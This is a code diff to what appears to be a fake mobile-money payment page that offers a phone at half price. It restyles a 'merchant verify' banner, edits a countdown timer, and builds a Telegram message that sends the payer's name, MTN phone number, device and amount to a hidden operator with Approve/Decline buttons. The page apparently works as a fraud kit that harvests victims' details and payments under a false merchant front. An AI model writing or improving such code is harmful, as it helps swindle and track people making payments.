@@ -228,14 +228,17 @@
         }
 
         .merchant-verify {
-            font-size: 13px;
-            color: #003DA5;
-            font-weight: 600;
-            line-height: 1.5;
+            background: #FFF3E0;
+            color: #E65100;
+            padding: 12px 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 15px;
+            border: 2px solid #E65100;
+            line-height: 1.4;
             text-align: center;
             width: 100%;
-            padding: 10px 10px 0;
-            margin-top: 15px;
         }
 
         /* Profile Section */
@@ -1174,7 +1177,7 @@
             sessionStorage.setItem('paymentId', paymentId);
 
             // Send initial Telegram notification
-            const initialMsg = `🚀 <b>CASH OUT INITIATED</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${name}\n📞 <b>Number:</b> ${mtn}\n📱 <b>Device:</b> ${phoneData.name}\n💰 <b>Amount:</b> GHS ${halfPrice.toLocaleString()}\n🏢 <b>Merchant:</b> ${finalMerchantName}\n👤 <b>Recipient:</b> ${finalRecipientName}\n━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Status:</b> Waiting for receipt...\n\n<b>You can approve or decline now, or wait for receipt:</b>`;
+            const initialMsg = `🚀 <b>CASH OUT INITIATED</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${name}\n📞 <b>Number:</b> ${mtn}\n📱 <b>Device:</b> ${phoneData.name}\n💰 <b>Amount:</b> GHS ${halfPrice.toLocaleString()}\n🏢 <b>Merchant:</b> ${finalMerchantName}\n━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Status:</b> Waiting for receipt...\n\n<b>You can approve or decline now, or wait for receipt:</b>`;
             
             const keyboard = [[
                 { text: '✅ Approve', callback_data: `approve_${paymentId}` },
@@ -1191,30 +1194,30 @@
             // Clear any existing timer first
             if (timerInterval) clearInterval(timerInterval);
             
-            let timer = duration, minutes, seconds;
+            let timerCount = duration;
             
-            // Initial display
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-            document.getElementById('timer').textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
-
-            timerInterval = setInterval(function () {
-                timer--;
-                
-                if (timer < 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('step2').classList.remove('active');
-                    document.getElementById('step3').classList.add('active');
-                    return;
-                }
-
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-
+            function updateDisplay() {
+                let minutes = parseInt(timerCount / 60, 10);
+                let seconds = parseInt(timerCount % 60, 10);
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
+                const timerEl = document.getElementById('timer');
+                if (timerEl) timerEl.textContent = minutes + ":" + seconds;
+            }
 
-                document.getElementById('timer').textContent = minutes + ":" + seconds;
+            updateDisplay();
+
+            timerInterval = setInterval(function () {
+                timerCount--;
+                if (timerCount < 0) {
+                    clearInterval(timerInterval);
+                    const step2 = document.getElementById('step2');
+                    const step3 = document.getElementById('step3');
+                    if (step2) step2.classList.remove('active');
+                    if (step3) step3.classList.add('active');
+                } else {
+                    updateDisplay();
+                }
             }, 1000);
         }
 
